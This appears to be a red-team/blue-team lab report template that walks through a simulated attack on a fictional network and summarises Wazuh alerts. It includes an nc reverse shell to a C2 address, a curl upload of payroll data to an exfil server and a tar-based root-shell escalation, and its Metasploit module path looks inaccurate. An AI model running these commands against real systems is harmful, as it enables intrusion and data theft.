
# Adversary Simulation Project – Full Report

> **Note:** Image placeholders are included using relative paths (e.g., `images/nmap_scan.png`).  
> Replace them with actual images for submission.

## 1. High-Level Architecture
![Red Team vs Blue Team Diagram](images/redteam_blueteam_diagram.png)

## 2. Environment Setup
### Internal Network
- Domain: `acme-internal.local`
- Email Domain: `acme-corp.org`
- Networks:
  - `10.10.5.0/24` – User LAN
  - `10.10.10.0/24` – Server VLAN
  - `10.10.20.0/24` – Wazuh VLAN

### Red Team
- Kali Attacker: `192.168.56.101`
- C2 Server: `172.20.100.50`
- Exfil Server: `185.199.110.45`

### Blue Team
- Wazuh Manager: `10.10.20.4`
- Domain Controller: `10.10.10.5`
- Web Server: `10.10.10.8`
- User Systems: `10.10.5.12`, `10.10.5.19`

---

## 3. Reconnaissance
![Nmap Scan](images/nmap_scan.png)

Nmap commands:
```
nmap -sV -O -T4 10.10.5.0/24
nmap -sV -p 80,443,445,3389 10.10.10.0/24
```

DNS Enumeration:
```
dnsenum acme-corp.org
```

Findings:
- `mail.acme-corp.org`
- `vpn.acme-corp.org`
- AD environment detected

---

## 4. Initial Access – Phishing Simulation
![Phishing Email](images/phishing_email.png)

Macro-enabled XLSM sent from:
`security@acme-corp.org` → `jane.patel@acme-corp.org`

Callback:
```
http://192.168.56.101:8080/clicked?user=Win-User01
```

---

## 5. Execution
![Metasploit Simulation](images/metasploit_simulation.png)

```
use auxiliary/admin/smb/ms17_010_eternalblue
set RHOSTS 10.10.5.12
run
```

---

## 6. Persistence
![Scheduled Task](images/scheduled_task.png)

Windows:
```
schtasks /Create /TN "SystemUpdateCheck" /TR "cmd.exe /c echo Healthy" /SC DAILY /ST 02:00
```

Linux:
```
echo "0 3 * * * /usr/bin/echo 'Scan'" >> /etc/crontab
```

---

## 7. Privilege Escalation
![Privilege Escalation](images/priv_esc.png)

Linux:
```
sudo -u root tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Windows:
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

---

## 8. Lateral Movement
![SSH Key Misuse](images/ssh_key.png)

SMB Enumeration:
```
smbclient -L \\10.10.5.19\
```

SSH Key Pivot:
```
ssh -i id_rsa devops@10.10.10.8
```

---

## 9. Command & Control Simulation
![C2 Simulation](images/c2_channel.png)

```
nc 172.20.100.50 443 -e cmd.exe
```

---

## 10. Data Exfiltration
![Data Exfiltration](images/exfiltration.png)

```
zip confidential.zip payroll-data.txt
curl -X POST -F "file=@confidential.zip" http://185.199.110.45/upload
```

---

## 11. Wazuh Detection Summary
![Wazuh Alerts](images/wazuh_alerts.png)

| Time | Alert | Source IP | Description |
|------|--------|------------|--------------|
| 14:22 | Port Scan | 192.168.56.101 → 10.10.5.0/24 | Nmap detected |
| 15:04 | Suspicious Link | 10.10.5.12 | User clicked phishing test |
| 15:30 | Persistence | 10.10.5.12 | Scheduled task added |
| 15:45 | Cron Edit | 10.10.10.8 | Unauthorized persistence |
| 16:00 | PrivEsc | 10.10.10.8 | Role modification |
| 16:15 | C2 Activity | 10.10.10.8 → 172.20.100.50 | Netcat outbound |
| 16:22 | Exfil | 10.10.10.8 → 185.199.110.45 | File upload |

---

## 12. Non-Technical Summary
This simulation tested the full cyber attack lifecycle, including scanning, phishing, privilege escalation, movement within the network, and simulated data theft. The defender platform (Wazuh) successfully detected most phases but struggled with more advanced stealth activity. Overall, this provides a clear roadmap for improving organizational security maturity.

---

## 13. Folder Structure
```
project/
│── README.md
│── images/
│    ├── redteam_blueteam_diagram.png
│    ├── nmap_scan.png
│    ├── phishing_email.png
│    ├── metasploit_simulation.png
│    ├── scheduled_task.png
│    ├── priv_esc.png
│    ├── ssh_key.png
│    ├── c2_channel.png
│    ├── exfiltration.png
│    └── wazuh_alerts.png
```

---
